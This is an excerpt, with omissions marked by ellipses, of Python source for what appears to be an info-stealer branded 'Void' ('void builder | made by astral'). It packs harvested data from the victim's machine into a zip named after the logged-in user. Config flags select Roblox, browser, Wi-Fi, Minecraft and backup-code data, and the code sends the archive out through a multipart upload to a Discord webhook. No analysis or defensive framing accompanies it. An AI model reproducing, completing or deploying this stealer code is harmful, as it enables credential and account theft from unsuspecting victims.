...
def main(webhook: str):
    ...
    data = {
        "username": "Void",
        "avatar_url": "https://cdn.discordapp.com/attachments/1295236350844600362/1312644589034799184/void.png?ex=674d3f09&is=674bed89&hm=c6e9805e35ace51f93bcd08ec3b43be3c757f899966f397cb20c510c76e8ad72&"
    }

    _file = f'{localappdata}\\Void-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Void-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Void-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "void builder | made by astral"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1295236350844600362/1312644589034799184/void.png?ex=674d3f09&is=674bed89&hm=c6e9805e35ace51f93bcd08ec3b43be3c757f899966f397cb20c510c76e8ad72&"
                    }
                }
            ],
            "username": "Void",
